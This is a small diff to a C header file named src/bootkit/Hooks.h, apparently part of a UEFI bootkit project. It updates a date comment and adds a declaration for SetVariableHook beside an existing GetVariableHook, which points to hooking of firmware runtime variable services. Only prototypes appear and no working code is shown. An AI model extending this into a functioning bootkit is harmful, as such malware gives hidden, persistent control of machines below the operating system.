@@ -30,7 +30,7 @@
 
 /*
     *    src/bootkit/Hooks.h
-    *    Date: 11/27/22
+    *    Date: 12/14/22
     *    Author: @xmmword
 */
 
@@ -40,5 +40,8 @@ VOID *HookPointer(VOID **Function, VOID *HookFunction, EFI_TABLE_HEADER *Header)
 
 EFI_STATUS EFIAPI GetVariableHook(IN CHAR16 *VariableName, IN EFI_GUID *VendorGuid,
   OUT UINT32 *Attributes, OPTIONAL IN OUT UINTN *DataSize, OUT VOID *Data OPTIONAL);
+
+EFI_STATUS EFIAPI SetVariableHook(IN CHAR16 *VariableName, IN EFI_GUID *VendorGuid, 
+  IN UINT32 Attributes, IN UINTN DataSize, IN VOID *Data);
 
 #endif
